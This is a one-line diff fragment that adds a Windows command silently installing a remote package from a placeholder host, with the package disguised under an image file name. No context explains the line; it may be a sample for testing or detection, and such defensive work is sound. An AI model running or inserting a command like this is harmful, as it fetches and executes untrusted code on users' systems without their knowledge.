@@ -1,0 +1,2 @@
+msiexec /q /i http://example.invalid/setup.png
+
